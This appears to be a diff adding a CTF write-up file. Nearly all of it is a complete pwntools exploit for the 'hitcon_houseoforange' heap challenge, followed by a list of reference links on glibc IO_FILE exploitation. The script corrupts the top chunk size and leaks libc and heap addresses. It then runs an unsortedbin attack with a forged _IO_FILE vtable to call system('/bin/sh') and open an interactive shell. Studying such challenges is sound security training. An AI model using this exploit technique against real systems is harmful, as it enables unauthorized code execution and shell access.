@@ -1,0 +1,152 @@
+
+```python
+from pwn import *
+from LibcSearcher import LibcSearcher
+from sys import argv
+from pwn_debug import *
+
+context(log_level='debug',arch='amd64')#,terminal=['tmux','sp','-h'])
+
+def ret2libc(leak, func, path=''):
+    if path == '':
+        libc = LibcSearcher(func, leak)
+        base = leak - libc.dump(func)
+        system = base + libc.dump('system')
+        binsh = base + libc.dump('str_bin_sh')
+    else:
+        libc = ELF(path)
+        base = leak - libc.sym[func]
+        system = base + libc.sym['system']
+        binsh = base + libc.search('/bin/sh').next()
+    return (system, binsh)
+
+s = lambda data               :p.send(str(data))
+sa = lambda delim,data         :p.sendafter(str(delim), str(data))
+sl = lambda data               :p.sendline(str(data))
+sla = lambda delim,data         :p.sendlineafter(str(delim), str(data))
+r = lambda num=4096           :p.recv(num)
+ru = lambda delims, drop=True  :p.recvuntil(delims, drop)
+itr = lambda                   :p.interactive()
+uu32 = lambda data             :u32(data.ljust(4,'\0'))
+uu64 = lambda data             :u64(data.ljust(8,'\0'))
+leak = lambda name,addr        :log.success('{} = {:#x}'.format(name, addr))
+
+p = process("./hitcon_houseoforange")
+# p = remote("node4.buuoj.cn",29535)
+libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
+# libc = ELF('./libc-2.23.so')
+elf = ELF("./hitcon_houseoforange")
+
+def dbg():
+    gdb.attach(p)
+    pause()
+
+def command(id):
+    ru("Your choice : ")
+    sl(str(id))
+
+def build(name_len,name,price=0xdeadbeef,color=0xddaa):
+    # 56746 = 0xddaa
+    command(1)
+    ru("Length of name :")
+    sl(str(name_len))
+    ru("Name :")
+    sl(name)
+    ru("Price of Orange:")
+    sl(str(price))
+    ru("Color of Orange:")
+    sl(str(color))
+
+def see():
+    command(2)
+
+def upgrade(name_len,name,price=0xdeadbeef,color=0xddaa):
+    command(3)
+    ru("Length of name :")
+    sl(str(name_len))
+    ru("Name:")
+    sl(name)
+    ru("Price of Orange: ")
+    sl(str(price))
+    ru("Color of Orange: ")
+    sl(str(color))
+
+'''step1: leak address of _IO_list_all and heap'''
+
+# overwrite the size of top
+build(0x10,b'a'*8) # house_chunk, name_chunk,orange_chunk
+# dbg()
+payload = b'b'*0x10   # content(name_chunk): 0x10
+payload += p64(0) + p64(0x21) + p32(0xdeadbeef) + p32(0xddaa) + p64(0) # content(name_chunk) + orange_chunk: 0x10+0x20 = 0x30
+payload += p64(0) + p64(0xfa1) # content(name_chunk) + orange_chunk + head(topchunk) 0x10+0x20+0x10 = 0x40
+upgrade(0x41,payload)
+# dbg()
+
+build(0x1000,b'c'*8) # trigger the _int_free in sysmalloc, old top chunk -> unsortedbin
+# dbg()
+build(0x400,b'd'*7) # leak the address io_list_all (0x400 -> largebin chunk -> leak fd_nextsize later)
+see()
+ru('ddddddd\n')
+libc_addr = u64(r(6).ljust(8,"\x00")) - 0x3c5188
+libc.address = libc_addr
+io_list_all_addr = libc.sym['_IO_list_all']
+system_addr = libc.sym['system']
+leak('addr(_IO_list_all)',io_list_all_addr)
+leak('addr(libc_base)',libc_addr)
+leak('addr(system)',system_addr)
+# dbg()
+
+upgrade(0x10,b'e'*0xf) # leak heap addr
+see()
+ru('e'*0xf + '\n')
+heap_addr = u64(r(6).ljust(8,"\x00")) - (0x20*6) # house1,name1,orange1,house2,orange2,house3
+fake_vtable_addr = heap_addr + (0x20*6) + 0x410 + 0x20 + 0x8*12
+leak('addr(heap)',heap_addr)
+leak('addr(vtable)', fake_vtable_addr)
+
+# dbg()
+
+''' step2：unsortedbin attack and fsop '''
+payload = b'f'*0x400 # name3
+payload += p64(0) + p64(0x21) + 2*p64(1) # orange3
+
+fake_file = IO_FILE_plus()
+fake_file._flags = 0x0068732f6e69622f # /bin/sh
+fake_file._IO_read_ptr = 0x61
+# overwrite old_top_chunk's size
+fake_file._IO_read_base = io_list_all_addr - 0x10
+# overwrite old_top_chunk's bk (for unsortedbin attack)
+fake_file._IO_write_base = 0
+fake_file._IO_write_ptr = 1
+fake_file._mode = 0
+fake_file._old_offset = libc.sym["system"]
+fake_file.vtable = fake_vtable_addr # &old_top_chunk[12]
+fake_file.show()
+payload += str(fake_file)
+upgrade(0x1000,payload)
+# dbg()
+command(1) # 触发攻击
+itr()
+```
+
+# 参考文献
+
+- [IO_FILE 与高版本 glibc 中的漏洞利用技巧](https://bbs.kanxue.com/elink@cbbK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6W2N6X3W2D9M7r3q4F1i4K6u0W2j5$3!0E0i4K6u0r3x3U0l9J5x3W2)9J5c8U0l9%4i4K6u0r3x3K6m8Q4x3V1k6Y4L8r3W2T1j5#2)9J5k6r3g2^5M7q4)9J5k6s2c8J5K9h3y4C8M7#2)9J5c8R3`.`.)
+
+- [ctf-wiki-伪造 vtable 劫持程序流程](https://bbs.kanxue.com/elink@ffbK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6U0N6r3k6Q4x3X3c8%4K9h3E0A6i4K6u0W2L8%4u0Y4i4K6u0r3M7s2N6F1i4K6u0r3L8r3W2F1N6i4S2Q4x3V1k6#2M7$3g2J5i4K6u0V1L8h3!0V1k6g2)9J5c8X3W2G2i4K6u0V1k6X3W2D9k6g2)9J5c8X3k6S2K9$3g2Q4x3X3c8$3N6r3q4T1L8r3g2Q4x3X3c8W2P5s2m8D9L8$3W2@1i4K6u0r3)
+
+- [ctf-wiki-FSOP](https://bbs.kanxue.com/elink@3b2K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6U0N6r3k6Q4x3X3c8%4K9h3E0A6i4K6u0W2L8%4u0Y4i4K6u0r3M7s2N6F1i4K6u0r3L8r3W2F1N6i4S2Q4x3V1k6#2M7$3g2J5i4K6u0V1L8h3!0V1k6g2)9J5c8X3W2G2i4K6u0V1k6X3W2D9k6g2)9J5c8X3k6K6L8%4m8Q4x3V1j5`.)
+
+- [glibc 2.24 下 IO_FILE 的利用](https://bbs.kanxue.com/elink@eedK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6U0N6r3k6Q4x3X3c8%4K9h3E0A6i4K6u0W2L8%4u0Y4i4K6u0r3M7s2N6F1i4K6u0r3L8r3W2F1N6i4S2Q4x3V1k6#2M7$3g2J5i4K6u0V1L8h3!0V1k6g2)9J5c8X3W2G2i4K6u0V1k6X3W2D9k6g2)9J5c8X3g2^5M7r3I4G2K9i4c8Q4x3X3c8A6L8W2)9J5k6r3I4A6j5X3x3J5i4K6u0W2x3U0c8Q4x3V1j5`.)
+
+- [IO学习记录](https://bbs.kanxue.com/elink@aecK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6U0K9r3g2F1M7h3W2%4z5g2)9J5k6h3N6A6N6r3S2#2j5W2)9J5k6h3W2G2i4K6u0r3x3U0l9J5x3g2)9J5c8U0l9@1i4K6u0r3x3e0y4Q4x3V1k6u0e0#2)9J5y4f1f1#2i4K6t1#2b7f1c8Q4x3U0g2m8y4W2)9J5y4f1f1@1i4K6t1#2b7U0W2Q4x3U0g2m8x3q4)9J5y4f1f1^5i4K6t1#2b7f1g2Q4x3U0g2n7x3q4)9J5y4f1f1#2i4K6t1#2b7V1c8Q4x3U0f1&6y4g2)9J5c8R3`.`.)
+
+- [IO FILE之fopen详解](https://bbs.kanxue.com/elink@b0aK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6J5j5i4W2Q4x3X3c8U0M7q4)9J5k6h3N6A6N6r3S2#2j5W2)9J5k6h3W2G2i4K6u0r3j5i4u0U0K9r3W2$3k6i4u0K6i4K6u0r3d9f1!0Q4y4h3k6r3d9f1I4q4i4K6g2X3k6X3!0H3k6h3&6Q4y4h3k6S2L8X3q4D9P5i4y4A6M7H3`.`.)
+
+- [IO FILE之fread详解](https://bbs.kanxue.com/elink@1d0K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6J5j5i4W2Q4x3X3c8U0M7q4)9J5k6h3N6A6N6r3S2#2j5W2)9J5k6h3W2G2i4K6u0r3j5i4u0U0K9r3W2$3k6i4u0K6i4K6u0r3d9f1!0Q4y4h3k6r3d9f1I4q4i4K6g2X3k6Y4u0W2j5h3c8Q4y4h3k6S2L8X3q4D9P5i4y4A6M7H3`.`.)
+
+- [IO FILE之fwrite详解](https://bbs.kanxue.com/elink@bfbK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2@1N6s2c8S2L8X3N6Q4x3X3g2U0L8$3#2Q4x3V1k6S2M7X3y4Z5K9i4k6W2i4K6u0r3x3e0t1%4z5g2)9J5c8R3`.`.)
+
+- [IO FILE之fclose详解](https://bbs.kanxue.com/elink@a7eK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6J5j5i4W2Q4x3X3c8U0M7q4)9J5k6h3N6A6N6r3S2#2j5W2)9J5k6h3W2G2i4K6u0r3j5i4u0U0K9r3W2$3k6i4u0K6i4K6u0r3d9f1!0Q4y4h3k6r3d9f1I4q4i4K6g2X3k6X3y4D9L8%4y4W2i4K6g2X3j5h3&6S2L8s2W2K6K9i4x3`.)
+
+
